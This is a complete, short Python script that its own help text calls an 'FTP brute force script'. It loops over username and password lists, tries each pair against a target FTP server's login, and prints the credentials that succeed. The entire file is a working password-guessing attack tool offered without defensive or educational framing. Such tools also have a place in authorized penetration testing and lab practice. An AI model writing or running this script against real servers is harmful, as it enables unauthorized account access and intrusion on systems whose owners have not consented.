#!/usr/bin/env python3

from ftplib import FTP
import argparse
import time


def brute(target, username, password, delay):
    try:
        ftp = FTP(target)
        ftp.login(user=username, passwd=password)
        print(f'Successful login: {username}:{password}')
        ftp.quit()
    except:
        print(f'Failed login: {username}:{password}')
    time.sleep(delay / 1000) 


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='FTP brute force script')
    parser.add_argument('target', metavar='TARGET', help='Target IP address')
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument('-u', dest='username', help='Username to brute force')
    group.add_argument('-U', dest='userlist', help='File containing usernames')
    parser.add_argument('-P', dest='passwords', help='File containing passwords', required=True)
    parser.add_argument('-t', dest='delay', metavar='DELAY', type=int, help='Delay in ms between any request', required=True)

    args = parser.parse_args()

    usernames = [args.username] if args.username else open(args.userlist, 'r').read().splitlines()

    passwords = open(args.passwords, 'r').read().splitlines()

    for username in usernames:
        for password in passwords:
            brute(args.target, username, password, args.delay)